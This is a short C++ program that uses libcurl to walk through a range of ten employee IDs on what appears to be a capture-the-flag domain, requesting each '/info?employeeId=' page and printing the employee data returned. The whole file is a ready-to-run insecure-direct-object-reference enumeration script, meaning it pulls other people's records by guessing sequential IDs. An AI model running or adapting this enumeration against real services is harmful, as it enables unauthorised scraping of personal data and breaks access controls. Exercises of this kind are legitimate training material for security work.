
#include <iostream>
#include <string>
#include <cstdlib>
#include <curl/curl.h>
#include <sstream>

static size_t WriteCallback(void *contents, size_t size, size_t nmemb, void *userp)
{
    ((std::string*)userp)->append((char*)contents, size * nmemb);
    return size * nmemb;
}

int main()
{
    CURL *curl;
    CURLcode res;
    std::string readBuffer;

    curl = curl_easy_init();
    if(curl) {
        for(int i = 8691230; i < 8691240; i++) {
            std::string url = "https://www.wildberries-ctf.ru/info?employeeId=";
            url += std::to_string(i);
            
            curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
            curl_easy_setopt(curl, CURLOPT_WRITEDATA, &readBuffer);
            res = curl_easy_perform(curl);
            
            if(res != CURLE_OK)
                fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
            else
                std::cout << "ID workera" << i << " info: " << readBuffer << std::endl;
            
            readBuffer.clear();
        }
        curl_easy_cleanup(curl);
    }
    return 0;
}